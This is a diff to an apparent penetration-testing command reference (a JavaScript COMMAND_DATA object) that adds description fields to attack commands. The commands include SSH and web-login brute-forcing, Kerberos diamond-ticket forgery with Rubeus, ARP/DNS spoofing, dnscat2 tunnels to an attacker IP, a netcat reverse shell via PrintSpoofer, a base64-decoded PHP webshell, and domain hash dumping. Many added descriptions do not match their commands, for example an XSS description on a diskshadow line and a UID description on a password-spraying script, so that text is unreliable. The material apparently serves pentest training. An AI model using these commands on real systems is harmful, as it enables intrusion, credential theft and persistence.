           "caption": "Pipe directly to hydra for online brute-force",
-          "label": "Pipe -> hydra (SSH)"
+          "label": "Pipe -> hydra (SSH)",
+          "description": "Brute-forces SSH credentials using Hydra. Tests username/password combinations against the SSH service for initial access."
         }
       ],
       "examples": [
@@ -28681,11 +28870,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Numeric PIN brute (0000-9999)",
-          "command": "import requests\nfor pin in range(10000):\n    p=f'{pin:04d}'\n    r=requests.get(f'http://<ip>:<port>/pin?pin={p}')\n    if r.ok and 'flag' in r.text:\n        print('FOUND',p,r.text); break"
+          "command": "import requests\nfor pin in range(10000):\n    p=f'{pin:04d}'\n    r=requests.get(f'http://<ip>:<port>/pin?pin={p}')\n    if r.ok and 'flag' in r.text:\n        print('FOUND',p,r.text); break",
+          "description": "Numeric PIN brute (0000-9999). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Dictionary attack (POST)",
-          "command": "import requests\nfor pw in open('<wordlist>').read().split():\n    r=requests.post(f'http://<ip>:<port>/login', data={'password':pw})\n    if 'Invalid' not in r.text:\n        print('FOUND',pw); break"
+          "command": "import requests\nfor pw in open('<wordlist>').read().split():\n    r=requests.post(f'http://<ip>:<port>/login', data={'password':pw})\n    if 'Invalid' not in r.text:\n        print('FOUND',pw); break",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "notes": "Success detection is the hard part - baseline a known-bad response first, then diff on status code, Content-Length, or a marker string ('Invalid'/'flag'). Add a session/CSRF-token fetch before each attempt if the app requires one. Thread with concurrent.futures for speed, but watch rate limits/lockout.",
@@ -28935,7 +29126,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Point at any SYSTEM-writable target path",
-          "command": "CVE-2020-0668.exe <payload_exe> \"C:\\Windows\\System32\\<dll_or_exe>\""
+          "command": "CVE-2020-0668.exe <payload_exe> \"C:\\Windows\\System32\\<dll_or_exe>\"",
+          "description": "Point at any SYSTEM-writable target path. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -30598,11 +30790,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "AES key",
-          "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<krbtgt_aes> /nowrap"
+          "command": "Rubeus.exe diamond /tgtdeleg /ticketuser:<user> /ticketuserid:<rid> /groups:512 /krbkey:<krbtgt_aes> /nowrap",
+          "description": "Uses Rubeus tgtdeleg to extract a usable TGT from the current logon session without needing elevation. Abuses the GSS-API to get an RC4-encrypted TGT even when AES keys are configured."
         },
         {
           "label": "Diamond ticket via credentials (/createnetonly)",
-          "command": "Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:student1 /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<dc_host> /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"
+          "command": "Rubeus.exe diamond /krbkey:<aes256_krbtgt> /user:student1 /password:<password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<dc_host> /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt",
+          "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
         }
       ],
       "explain": "Forges a Diamond Ticket - request a real TGT and rewrite its PAC, so it carries valid DC signatures (evades golden-ticket detection):\n  diamond                   modify a legitimately issued TGT\n  /tgtdeleg                 obtain a real TGT for the current user without their password\n  /ticketuser:<user> /ticketuserid:<rid>   the user and RID the modified ticket is for\n  /groups:512              inject Domain Admins (RID 512) into the PAC\n  /krbkey:<aes256_key>     the krbtgt AES256 key to re-sign the PAC\n  /nowrap                   single-line output\nInject it (/ptt) and you are DA with a ticket that looks KDC-issued."
@@ -31946,7 +32140,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Poison a remote gateway (SNAT)",
-          "command": "ettercap -T -q -i <interface> -P dns_spoof -M arp:remote //<target>// //<gateway>//"
+          "command": "ettercap -T -q -i <interface> -P dns_spoof -M arp:remote //<target>// //<gateway>//",
+          "description": "Poison a remote gateway (SNAT). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Poisons DNS answers on a LAN to redirect victims to your IP:\n  ettercap -T -q   text mode, quiet\n  -i <interface>   the capture interface\n  -P dns_spoof     the DNS-spoofing plugin (reads records from /etc/ettercap/etter.dns)\n  -M arp //<target>// //<gateway>//   ARP MITM between the victim and gateway\nWith the MITM in place, the plugin answers the victim's lookups with attacker-controlled addresses so their traffic hits your services; edit etter.dns first to set the spoofed records."
@@ -32054,23 +32249,28 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "SOA record",
-          "command": "dig soa www.<domain>.com"
+          "command": "dig soa www.<domain>.com",
+          "description": "Queries the SOA (Start of Authority) record for the domain. Shows the primary name server, admin email, and zone serial number - useful for DNS infrastructure mapping."
         },
         {
           "label": "NS records",
-          "command": "dig ns <domain> @<ip>"
+          "command": "dig ns <domain> @<ip>",
+          "description": "Queries NS (name server) records for the domain. Identifies authoritative DNS servers to target for zone transfers or DNS-based attacks."
         },
         {
           "label": "Version (CHAOS TXT)",
-          "command": "dig CH TXT version.bind <ip>"
+          "command": "dig CH TXT version.bind <ip>",
+          "description": "Queries TXT records for the domain. TXT records often contain SPF policies, DKIM keys, domain verification tokens, and sometimes internal configuration details."
         },
         {
           "label": "ANY records",
-          "command": "dig any <domain> @<ip>"
+          "command": "dig any <domain> @<ip>",
+          "description": "Queries a specific DNS server for domain records. Useful for querying internal DNS servers directly to resolve internal hostnames."
         },
         {
           "label": "AXFR internal zone",
-          "command": "dig axfr internal.<domain> @<ip>"
+          "command": "dig axfr internal.<domain> @<ip>",
+          "description": "Attempts a DNS zone transfer (AXFR) from the target name server. If allowed, dumps all DNS records for the domain - a critical misconfiguration that reveals the complete internal hostname inventory."
         }
       ],
       "opsec": "moderate",
@@ -32241,31 +32441,38 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "A / AAAA",
-          "command": "dig <domain> A\ndig <domain> AAAA"
+          "command": "dig <domain> A\ndig <domain> AAAA",
+          "description": "Queries AAAA (IPv6) records for the domain. IPv6 addresses may be accessible when IPv4 is filtered - dual-stack configurations sometimes have weaker IPv6 security."
         },
         {
           "label": "MX / NS / SOA",
-          "command": "dig <domain> MX\ndig <domain> NS\ndig <domain> SOA"
+          "command": "dig <domain> MX\ndig <domain> NS\ndig <domain> SOA",
+          "description": "Queries MX (mail exchanger) records for the domain. Identifies mail servers which may run exploitable services or provide additional attack surface."
         },
         {
           "label": "TXT / CNAME / ANY",
-          "command": "dig <domain> TXT\ndig <domain> CNAME\ndig <domain> ANY"
+          "command": "dig <domain> TXT\ndig <domain> CNAME\ndig <domain> ANY",
+          "description": "Queries TXT records for the domain. TXT records often contain SPF policies, DKIM keys, domain verification tokens, and sometimes internal configuration details."
         },
         {
           "label": "Use a specific resolver",
-          "command": "dig @<resolver> <domain>"
+          "command": "dig @<resolver> <domain>",
+          "description": "Queries a specific DNS server for domain records. Useful for querying internal DNS servers directly to resolve internal hostnames."
         },
         {
           "label": "Trace delegation",
-          "command": "dig +trace <domain>"
+          "command": "dig +trace <domain>",
+          "description": "Performs DNS queries for the target domain. DNS enumeration reveals hostnames, mail servers, and infrastructure details."
         },
         {
           "label": "Reverse lookup",
-          "command": "dig -x <ip>"
+          "command": "dig -x <ip>",
+          "description": "Performs a reverse DNS lookup (PTR record) to find the hostname associated with an IP address. Reveals internal naming conventions and identifies services."
         },
         {
           "label": "Concise output",
-          "command": "dig +short <domain>\ndig +noall +answer <domain>"
+          "command": "dig +short <domain>\ndig +noall +answer <domain>",
+          "description": "Performs DNS queries for the target domain. DNS enumeration reveals hostnames, mail servers, and infrastructure details."
         }
       ],
       "opsec": "moderate",
@@ -32412,19 +32619,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Subdomain brute force with wordlist",
-          "command": "dnsrecon -d <domain> -D <wordlist> -t brt"
+          "command": "dnsrecon -d <domain> -D <wordlist> -t brt",
+          "description": "Subdomain brute force with wordlist. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Zone transfer only",
-          "command": "dnsrecon -d <domain> -t axfr"
+          "command": "dnsrecon -d <domain> -t axfr",
+          "description": "Attempts zone transfers against all name servers for the domain using dnsrecon. Automated approach that tries AXFR against every NS record."
         },
         {
           "label": "Reverse PTR sweep on a CIDR",
-          "command": "dnsrecon -r <cidr> -t rvl"
+          "command": "dnsrecon -r <cidr> -t rvl",
+          "description": "Reverse PTR sweep on a CIDR. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Save output to XML",
-          "command": "dnsrecon -d <domain> -t std -x /tmp/dns-<domain>.xml"
+          "command": "dnsrecon -d <domain> -t std -x /tmp/dns-<domain>.xml",
+          "description": "Performs comprehensive DNS enumeration including zone transfers, brute-forcing, and record queries. Automates multiple DNS reconnaissance techniques."
         }
       ],
       "notes": "Run `-t std` first - if AXFR succeeds you get every record in one shot. Follow with `-t brt` against the NS servers found. Wildcard DNS (*.domain resolves to a single IP) can produce false positives in brute force; dnsrecon flags this automatically. Check MX, TXT/SPF, and NS records manually for third-party services and internal naming patterns. Also covered in: OSCP PEN-200 Chapter 6 (Information Gathering).",
@@ -32720,11 +32931,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All sources + save output",
-          "command": "subfinder -d <domain> -all -o subs.txt"
+          "command": "subfinder -d <domain> -all -o subs.txt",
+          "description": "Discovers subdomains using passive sources (certificate transparency, DNS datasets, search engines). Finds subdomains without sending queries to the target."
         },
         {
           "label": "Enumerate a list of domains",
-          "command": "subfinder -dL domains.txt -silent"
+          "command": "subfinder -dL domains.txt -silent",
+          "description": "Enumerate a list of domains. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Discovers subdomains passively from public sources (certificate logs, search engines, DNS aggregators) without touching the target, producing a list to probe for takeover or as new attack surface.:\n  -d <domain>  domain name\n  -v           verbose output\n  <domain>     Active Directory domain\nsubfinder pulls subdomains from dozens of passive sources (CT logs, APIs) fast and quietly - no packets to the target."
@@ -32799,11 +33012,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "dig loop",
-          "command": "for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.<domain> @<ip> | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done"
+          "command": "for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.<domain> @<ip> | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done",
+          "description": "Bash loop automating a repetitive operation across multiple targets or values. Useful for batch enumeration when purpose-built tools are unavailable."
         },
         {
           "label": "dnsenum",
-          "command": "dnsenum --dnsserver <ip> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain>"
+          "command": "dnsenum --dnsserver <ip> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain>",
+          "description": "Performs automated DNS enumeration including zone transfers, brute-forcing, and Google scraping. Discovers subdomains and DNS infrastructure in a single tool run."
         }
       ],
       "opsec": "moderate",
@@ -33106,19 +33321,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "TXT record",
-          "command": "nslookup -type=TXT <domain>"
+          "command": "nslookup -type=TXT <domain>",
+          "description": "Performs DNS lookups using the Windows nslookup utility. Built-in tool for quick DNS reconnaissance from any Windows host."
         },
         {
           "label": "TXT via specific DNS server",
-          "command": "nslookup -type=TXT <domain> <dns_server>"
+          "command": "nslookup -type=TXT <domain> <dns_server>",
+          "description": "TXT via specific DNS server. See the command syntax for exact parameters and flags."
         },
         {
           "label": "MX record",
-          "command": "nslookup -type=MX <domain>"
+          "command": "nslookup -type=MX <domain>",
+          "description": "Performs DNS lookups using the Windows nslookup utility. Built-in tool for quick DNS reconnaissance from any Windows host."
         },
         {
           "label": "Reverse PTR lookup",
-          "command": "nslookup <ip>"
+          "command": "nslookup <ip>",
+          "description": "Performs DNS lookups using the Windows nslookup utility. Built-in tool for quick DNS reconnaissance from any Windows host."
         }
       ],
       "examples": [
@@ -34109,17 +34328,20 @@ const COMMAND_DATA = {
         {
           "command": "./dnscat --secret=<secret> <domain>",
           "caption": "Linux dnscat2 client: connect to server by domain",
-          "label": "dnscat client - via domain (NS)"
+          "label": "dnscat client - via domain (NS)",
+          "description": "Dnscat client - via domain (NS). See the command syntax for exact parameters and flags."
         },
         {
           "command": "./dnscat --dns server=<attacker_ip>,port=53 --secret=<secret>",
           "caption": "Linux dnscat2 client: connect directly to server IP",
-          "label": "dnscat client - direct to server"
+          "label": "dnscat client - direct to server",
+          "description": "Dnscat client - direct to server. See the command syntax for exact parameters and flags."
         },
         {
           "command": "Import-Module .\\dnscat2.ps1\nStart-Dnscat2 -DNSserver <attacker_ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd",
           "caption": "PowerShell dnscat2 client (Windows target)",
-          "label": "Import-Module"
+          "label": "Import-Module",
+          "description": "Loads a PowerShell module into the current session. Makes the module's cmdlets available for use - commonly used to load offensive tools like PowerView, PowerUp, or custom scripts."
         }
       ],
       "defense": {
@@ -34806,7 +35028,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PowerView domain/password policy",
-          "command": "Get-DomainPolicyData | select -ExpandProperty SystemAccess"
+          "command": "Get-DomainPolicyData | select -ExpandProperty SystemAccess",
+          "description": "Uses PowerView to dump domain password and Kerberos policies. Shows password complexity requirements, lockout thresholds, and ticket lifetimes - critical for planning brute-force, spraying, and ticket-based attacks."
         }
       ],
       "explain": "Reads the domain password policy over an unauthenticated (null) SMB session:\n  crackmapexec smb <dc_ip>  connect to the DC over SMB\n  -u '' -p ''              null session (empty username and password)\n  --pass-pol               dump the account lockout threshold, observation window, and minimum length\nKnowing the lockout threshold and window lets you password-spray safely (stay one attempt under the threshold per window)."
@@ -35248,11 +35471,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "diskshadow scripted",
-          "command": "diskshadow /s <script_file>   # create shadow, then copy ntds.dit"
+          "command": "diskshadow /s <script_file>   # create shadow, then copy ntds.dit",
+          "description": "Cross-Site Scripting (XSS) payload that executes JavaScript in the victim's browser. Tests for reflected or stored XSS vulnerabilities in the web application."
         },
         {
           "label": "Parse offline",
-          "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+          "command": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
+          "description": "Uses Impacket secretsdump to extract NTDS.dit password hashes from a domain controller via DCSync (DRSUAPI). Retrieves all domain account hashes without touching the filesystem - requires DA or replication privileges."
         }
       ],
       "steps": [
@@ -35546,11 +35771,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "RCE path 2 - widen Allowable File Extensions, upload ASPX webshell",
-          "command": "# Settings > Security > More > More Security Settings -> add asp,aspx to Allowable File Extensions -> Save\n# then http://<ip>/admin/file-management -> upload webshell.asp -> right-click > Get URL -> browse to run commands"
+          "command": "# Settings > Security > More > More Security Settings -> add asp,aspx to Allowable File Extensions -> Save\n# then http://<ip>/admin/file-management -> upload webshell.asp -> right-click > Get URL -> browse to run commands",
+          "description": "RCE path 2 - widen Allowable File Extensions, upload ASPX webshell. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Escalate to SYSTEM via SeImpersonate (files land in Portals\\0)",
-          "command": "c:\\DotNetNuke\\Portals\\0\\PrintSpoofer64.exe -c \"c:\\DotNetNuke\\Portals\\0\\nc.exe <lhost> 443 -e cmd\""
+          "command": "c:\\DotNetNuke\\Portals\\0\\PrintSpoofer64.exe -c \"c:\\DotNetNuke\\Portals\\0\\nc.exe <lhost> 443 -e cmd\"",
+          "description": "Escalate to SYSTEM via SeImpersonate (files land in Portals\\0). See the command syntax for exact parameters and flags."
         }
       ],
       "examples": [
@@ -35836,7 +36063,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Create webshell via base64 decode (alternative to embedding in module)",
-          "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php"
+          "command": "echo 'PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K' | base64 -d > /var/www/html/modules/captcha/shell.php",
+          "description": "Create webshell via base64 decode (alternative to embedding in module). See the command syntax for exact parameters and flags."
         }
       ],
       "defense": {
@@ -37116,11 +37344,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Kerberoastable (SPN set)",
-          "command": "dsquery * -filter \"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\" -attr samAccountName"
+          "command": "dsquery * -filter \"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\" -attr samAccountName",
+          "description": "Uses the native Windows dsquery tool to find accounts with SPNs set (Kerberoastable). No external modules needed - works from any domain-joined command prompt."
         },
         {
           "label": "AS-REP roastable (no preauth)",
-          "command": "dsquery * -filter \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" -attr samAccountName"
+          "command": "dsquery * -filter \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" -attr samAccountName",
+          "description": "Uses dsquery to find accounts with Kerberos pre-auth disabled (AS-REP Roastable). Native Windows tool requiring no module imports."
         }
       ],
       "explain": "Runs an LDAP filter with the built-in dsquery tool (no extra tooling):\n  dsquery *   raw LDAP search\n  -filter \"(...userAccountControl:1.2.840.113556.1.4.803:=32)\"   the OID :=32 bit is PASSWD_NOTREQD - matches accounts allowing a blank password\n  -attr sAMAccountName userAccountControl   fields to return\nA living-off-the-land way to hunt risky UAC flags; swap the bit value (4194304 = no-preauth) or the filter to find other classes of accounts."
@@ -37369,15 +37599,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Get the DSRM (local admin) hash via DCSync",
-          "command": "lsadump::lsa /inject /name:<dc_name>$"
+          "command": "lsadump::lsa /inject /name:<dc_name>$",
+          "description": "Dumps LSA secrets including service account passwords, cached domain credentials, and computer account passwords from the local security database."
         },
         {
           "label": "Dump DSRM hash (token::elevate + lsadump::sam)",
-          "command": "SafetyKatz.exe \"token::elevate\" \"lsadump::sam\" \"exit\""
+          "command": "SafetyKatz.exe \"token::elevate\" \"lsadump::sam\" \"exit\"",
+          "description": "Extracts password hashes from the local SAM database. Dumps NTLM hashes for all local user accounts on the machine."
         },
         {
           "label": "Enable DSRM logon behavior (reg add)",
-          "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f"
+          "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f",
+          "description": "Enable DSRM logon behavior (reg add). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Enables the DC's local DSRM administrator for network logon - a persistence account whose hash is not tied to AD password resets:\n  New-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\'   the LSA key on the DC\n  -Name 'DsrmAdminLogonBehavior'   the value that governs DSRM logon\n  -Value 2                 allow the DSRM account to log on over the network\n  -PropertyType DWORD      registry value type\nDump the DSRM hash (lsadump::lsa /patch), set this, then pass-the-hash as the DC's local Administrator to that DC."
@@ -38537,11 +38770,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Toggle logging / dump history for the current pane",
-          "command": "# <prefix> shift+p  -> start/stop logging to a file\n# <prefix> alt+shift+p -> save the entire visible history"
+          "command": "# <prefix> shift+p  -> start/stop logging to a file\n# <prefix> alt+shift+p -> save the entire visible history",
+          "description": "Toggle logging / dump history for the current pane. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Quick alternative without tmux",
-          "command": "script -a engagement-$(date +%F).log   # append all terminal I/O to a file"
+          "command": "script -a engagement-$(date +%F).log   # append all terminal I/O to a file",
+          "description": "Quick alternative without tmux. See the command syntax for exact parameters and flags."
         }
       ],
       "notes": "tmux-logging writes everything typed into a pane to a log file - invaluable for the Activity Log and Payload Log sections of a report, and for recreating an attack path. Also track things you tried that did NOT work: in a low-finding engagement, that narrative shows the client what they are adequately protected against. Change the default log path and key bindings via the plugin's configuration docs. Pair with a per-command timestamp habit for defensible evidence. This is a methodology/evidence card, not an attack.",
@@ -38801,11 +39036,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "With PSCredential",
-          "command": "Enter-PSSession -ComputerName <target> -Credential (Get-Credential)"
+          "command": "Enter-PSSession -ComputerName <target> -Credential (Get-Credential)",
+          "description": "Opens an interactive PowerShell Remoting session to a remote machine. Provides a live shell on the target through WinRM - similar to SSH for Windows environments."
         },
         {
           "label": "Over an existing session var",
-          "command": "$s = New-PSSession -ComputerName <target> -Credential $cred; Enter-PSSession $s"
+          "command": "$s = New-PSSession -ComputerName <target> -Credential $cred; Enter-PSSession $s",
+          "description": "Over an existing session var. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -39072,15 +39309,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Filter users by display name",
-          "command": "Get-MgUser -Filter \"startswith(displayName,'<prefix>')\" | ConvertTo-Json"
+          "command": "Get-MgUser -Filter \"startswith(displayName,'<prefix>')\" | ConvertTo-Json",
+          "description": "Filter users by display name. See the command syntax for exact parameters and flags."
         },
         {
           "label": "List service principals assigned to a directory role",
-          "command": "Get-MgDirectoryRoleMemberAsServicePrincipal -DirectoryRoleId <role_id> | ConvertTo-Json"
+          "command": "Get-MgDirectoryRoleMemberAsServicePrincipal -DirectoryRoleId <role_id> | ConvertTo-Json",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "App delegated (OAuth2) permissions",
-          "command": "$app = Get-MgApplication -ApplicationId <app_obj_id>\n$app.Oauth2RequirePostResponse | ConvertTo-Json"
+          "command": "$app = Get-MgApplication -ApplicationId <app_obj_id>\n$app.Oauth2RequirePostResponse | ConvertTo-Json",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "notes": "Every Entra object has a unique objectId. Objects: Users, Groups (security/dynamic/M365), Devices (AAD-joined/hybrid/registered), Applications (+ service principals + managed identities). Directory roles = Entra admin roles (Global Admin, Application Admin, User Admin...) - distinct from ARM RBAC roles. getuserrealm.srf tells you (unauthenticated) whether a domain is Managed (Entra) or Federated. Enumerate app RequiredResourceAccess / OAuth2 permissions to find over-privileged apps to abuse.",
@@ -39421,7 +39661,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Verbose all",
-          "command": "enum4linux -a -v <dc_ip>"
+          "command": "enum4linux -a -v <dc_ip>",
+          "description": "Runs enum4linux-ng in full enumeration mode, collecting users, groups, shares, password policy, and OS info via SMB/RPC. Comprehensive Linux-based Windows domain enumeration tool."
         }
       ],
       "steps": [
@@ -39642,7 +39883,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "With creds",
-          "command": "enum4linux-ng -u <user> -p <password> -A <dc_ip> -oA out"
+          "command": "enum4linux-ng -u <user> -p <password> -A <dc_ip> -oA out",
+          "description": "Runs enum4linux-ng in full enumeration mode, collecting users, groups, shares, password policy, and OS info via SMB/RPC. Comprehensive Linux-based Windows domain enumeration tool."
         }
       ],
       "explain": "The modern rewrite of enum4linux with structured output:\n  enum4linux-ng   Python reimplementation\n  -P <dc_ip>      dump the password policy\n  -oA <outfile>   save results to JSON and YAML\nUse -P first to learn the lockout threshold before spraying; -A runs the full suite, and -u/-p adds authentication."
@@ -39726,11 +39968,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Mounts / fstab",
-          "command": "cat /etc/fstab\ncat /etc/fstab | grep -v \"#\" | column -t\ndf -h\nlsblk\nlpstat"
+          "command": "cat /etc/fstab\ncat /etc/fstab | grep -v \"#\" | column -t\ndf -h\nlsblk\nlpstat",
+          "description": "Reads the contents of a file for information gathering. Target files often contain credentials, configuration details, or sensitive data."
         },
         {
           "label": "Hidden files/dirs",
-          "command": "find / -type f -name \".*\" -exec ls -l {} \\; 2>/dev/null | grep <user>\nfind / -type d -name \".*\" -ls 2>/dev/null\nls -l /tmp /var/tmp /dev/shm"
+          "command": "find / -type f -name \".*\" -exec ls -l {} \\; 2>/dev/null | grep <user>\nfind / -type d -name \".*\" -ls 2>/dev/null\nls -l /tmp /var/tmp /dev/shm",
+          "description": "Searches the filesystem for files matching specific criteria. Used in enumeration to find SUID binaries, writable files, configuration files, and other privilege escalation opportunities."
         }
       ],
       "opsec": "moderate",
@@ -40242,15 +40486,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Identity",
-          "command": "whoami\nid\nhostname\nsudo -l"
+          "command": "whoami\nid\nhostname\nsudo -l",
+          "description": "Lists the commands the current user can run via sudo. Sudo misconfigurations (NOPASSWD entries, wildcard paths, or GTFOBins-eligible commands) are a primary privilege escalation vector on Linux."
         },
         {
           "label": "OS / kernel",
-          "command": "cat /etc/os-release\nuname -a\ncat /proc/version\nlscpu\ncat /etc/shells"
+          "command": "cat /etc/os-release\nuname -a\ncat /proc/version\nlscpu\ncat /etc/shells",
+          "description": "Displays kernel version and OS details. Identifies the exact kernel version for matching against known local privilege escalation exploits (DirtyPipe, DirtyCow, etc.)."
         },
         {
           "label": "PATH / env",
-          "command": "echo $PATH\nenv"
+          "command": "echo $PATH\nenv",
+          "description": "Writes text to a file or stdout for various post-exploitation purposes (persistence, payload deployment, or file manipulation)."
         }
       ],
       "opsec": "moderate",
@@ -40338,15 +40585,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Interfaces / hosts",
-          "command": "ip a\nifconfig\ncat /etc/hosts"
+          "command": "ip a\nifconfig\ncat /etc/hosts",
+          "description": "Shows network interface configuration including IP addresses, subnets, and additional network segments. Identifies dual-homed hosts for pivoting to other networks."
         },
         {
           "label": "Routing / DNS / ARP",
-          "command": "route\nnetstat -rn\ncat /etc/resolv.conf\narp -a"
+          "command": "route\nnetstat -rn\ncat /etc/resolv.conf\narp -a",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         },
         {
           "label": "Logged-in users",
-          "command": "lastlog\nw\nwho\nfinger"
+          "command": "lastlog\nw\nwho\nfinger",
+          "description": "Shows the last login time for all user accounts. Identifies accounts that are actively used versus dormant accounts."
         }
       ],
       "opsec": "moderate",
@@ -40445,15 +40695,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Processes / proc",
-          "command": "ps aux | grep root\nfind /proc -name cmdline -exec cat {} \\; 2>/dev/null | tr \" \" \"\\n\"\nfind / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2>/dev/null"
+          "command": "ps aux | grep root\nfind /proc -name cmdline -exec cat {} \\; 2>/dev/null | tr \" \" \"\\n\"\nfind / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2>/dev/null",
+          "description": "Lists all running processes with their user context. Identifies services running as root, reveals running applications, and may expose command-line credentials."
         },
         {
           "label": "Packages / binaries",
-          "command": "apt list --installed | tr \"/\" \" \" | cut -d\" \" -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list\nsudo -V\nls -l /bin /usr/bin/ /usr/sbin/"
+          "command": "apt list --installed | tr \"/\" \" \" | cut -d\" \" -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list\nsudo -V\nls -l /bin /usr/bin/ /usr/sbin/",
+          "description": "Installs or manages packages on Debian/Ubuntu. If apt can be run via sudo, it can be exploited for privilege escalation through its changelog or pre/post hooks."
         },
         {
           "label": "Configs / scripts",
-          "command": "find / -type f \\( -name *.conf -o -name *.config \\) -exec ls -l {} \\; 2>/dev/null\nfind / -type f -name \"*.sh\" 2>/dev/null | grep -v \"src\\|snap\\|share\"\nstrace ping -c1 <ip>"
+          "command": "find / -type f \\( -name *.conf -o -name *.config \\) -exec ls -l {} \\; 2>/dev/null\nfind / -type f -name \"*.sh\" 2>/dev/null | grep -v \"src\\|snap\\|share\"\nstrace ping -c1 <ip>",
+          "description": "Searches the filesystem for configuration files that may contain credentials. Common hiding places for passwords, database connection strings, and API keys."
         }
       ],
       "opsec": "moderate",
@@ -40539,11 +40792,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Users",
-          "command": "cat /etc/passwd\ncat /etc/passwd | cut -f1 -d:\ngrep \"sh$\" /etc/passwd"
+          "command": "cat /etc/passwd\ncat /etc/passwd | cut -f1 -d:\ngrep \"sh$\" /etc/passwd",
+          "description": "Reads the local user list from /etc/passwd. Every user on the system is listed here including their home directory and shell - identifies potential targets and service accounts."
         },
         {
           "label": "Groups",
-          "command": "cat /etc/group\ngetent group sudo\nls /home"
+          "command": "cat /etc/group\ngetent group sudo\nls /home",
+          "description": "Reads the contents of a file for information gathering. Target files often contain credentials, configuration details, or sensitive data."
         }
       ],
       "opsec": "moderate",
@@ -40624,7 +40879,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Directories",
-          "command": "find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null"
+          "command": "find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null",
